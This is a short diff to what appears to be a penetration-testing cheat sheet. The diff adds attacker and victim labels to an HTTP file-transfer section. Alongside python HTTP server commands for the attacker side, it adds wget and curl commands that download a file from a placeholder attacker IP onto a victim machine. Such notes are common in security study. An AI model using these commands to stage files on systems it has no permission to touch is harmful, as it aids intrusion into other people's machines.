@@ -8,9 +8,19 @@ For the sake of example, everything labeled as a "task" can be considered the da
 
 # File Transfers
 ## HTTP
+On the attacker machine:
 ```shell
 python -m SimpleHTTPServer <portno> # Start a python 2 http server in cwd
 python3 -m http.server <portno> # start a python3 http server in cwd
+```
+
+On the victim machine:
+```bash
+(Linux)
+wget http://<attackerIP>:<portno>/FileToTransfer
+
+(Windows)
+curl http://<attackerIP>:<portno>/FileToTransfer -O FileToTransfer
 ```
 
 ## SMB
